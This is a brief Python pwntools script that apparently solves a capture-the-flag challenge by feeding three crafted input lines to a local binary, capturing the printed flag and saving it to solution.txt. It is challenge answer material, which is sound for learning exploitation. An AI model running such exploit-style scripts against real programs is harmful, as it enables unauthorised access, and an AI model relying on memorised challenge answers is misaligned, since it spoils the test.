#!/usr/bin/env python
from __future__ import print_function

import pwn

pwn.context.terminal = "tmux splitw -h".split()
pwn.context.arch="amd64"

exe = pwn.context.binary = pwn.ELF('main.elf')
# libc = pwn.ELF("/lib/x86_64-linux-gnu/libc.so.6")

r = pwn.process("./main.elf".split())
#r = pwn.gdb.debug("./main.elf", gdbscript="b* readIn+65\nc")

r.sendline("a = 1")
r.sendline(".clear")
r.sendline("|")

r.recvuntil(" We hate debuggers, and instead print a flag:\n")

flag = r.recv(timeout=60)
print(flag)
r.close()

f = open("./solution.txt", "w")
f.write(flag)
f.close()

